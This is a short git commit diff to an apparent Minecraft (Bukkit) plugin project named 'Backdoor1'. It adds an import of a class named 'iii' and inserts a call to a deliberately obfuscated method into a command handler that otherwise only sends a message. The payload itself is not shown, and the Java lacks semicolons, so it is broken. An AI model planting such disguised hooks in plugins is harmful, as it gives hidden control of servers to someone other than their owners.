6e25b209bfd147560ce8e9970e7ee989d90d1af2
Torono909 <86355565+Torono909@users.noreply.github.com>
2022-02-03 11:47:23 +0530

    Update om.java

--- Backdoor1/src/main/java/me/lunacore/commands/om.java
+++ Backdoor1/src/main/java/me/lunacore/commands/om.java
@@ -1,5 +1,6 @@
 package me.lunacore.commands;
 
+import me.lunacore.backdoor1.iii;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -9,6 +10,7 @@ public class om implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player p = (Player) sender;
+        IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1()
         p.sendMessage("om command done")
         return true;
     }
